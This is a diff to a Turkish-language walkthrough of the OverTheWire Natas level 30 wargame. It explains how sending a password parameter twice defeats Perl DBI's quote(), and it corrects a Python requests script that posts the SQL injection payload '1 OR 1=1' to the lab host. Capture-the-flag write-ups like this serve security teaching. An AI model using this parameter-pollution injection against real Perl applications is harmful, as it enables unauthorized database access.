@@ -327,11 +327,14 @@ Perl `$dbh->quote(param("password"))` SQL injection'ı engellemeye çalışıyor
 
 ### 📖 Teori: Perl CGI param() ile Array
 
-`param("password")` yerine `param("password", "integer")` çağrılırsa, Perl'ın `quote()` fonksiyonu integer değer için tırnaksız (quote'suz) döner. Bu SQLi'ya kapı açar!
+`param("password")` **liste bağlamında** birden çok değer döndürebilir. `password`'ü iki kez gönderirsen (`password=X&password=Y`), `param("password")` → `("X", "Y")` listesi döner.
+
+`$dbh->quote(param("password"))` → `quote("X", "Y")` çağrısına düzleşir. **DBI'da `quote()`'un 2. argümanı bir SQL veri tipidir (`$data_type`).** Sayısal bir tip verilince `quote()` değeri **tırnaksız** döndürür (base implementasyondaki `unless ($data_type)` koruması atlanır) → SQLi'ya kapı açılır. (Not: CGI `param()`'ın 2. argümanı bir "tip" değildir; hile, listenin ikinci elemanının `quote()`'a *veri tipi* olarak geçmesidir.)
 
 ```perl
 $dbh->quote(param('password'))
-# param('password', 'integer') → 1 OR 1=1
+# param('password') → ("1 OR 1=1", 1)  → quote(değer, tip) → "1 OR 1=1" TIRNAKSIZ gömülür
+# (1. eleman = zararlı SQL değeri; 2. eleman = sayısal veri tipi, ör. 4=SQL_INTEGER)
 ```
 
 ### 🔧 Çözüm
@@ -343,12 +346,12 @@ from requests.auth import HTTPBasicAuth
 auth = HTTPBasicAuth("natas30", "<şifre>")
 url = "http://natas30.natas.labs.overthewire.org/"
 
-# password parametresini iki kez gönder: bir string, bir integer
+# password'ü iki kez gönder: 1) zararlı SQL DEĞERİ, 2) sayısal veri tipi (quote'u devre dışı bırakır)
 response = requests.post(url,
     data=[
-        ("username", "natas30"),
-        ("password", "anything"),
-        ("password", "1 OR 1=1")
+        ("username", "natas31"),
+        ("password", "1 OR 1=1"),   # 1. eleman: değer → quote tırnaksız gömer
+        ("password", "1")           # 2. eleman: sayısal tip (truthy) → tırnaklama atlanır
     ],
     auth=auth
 )
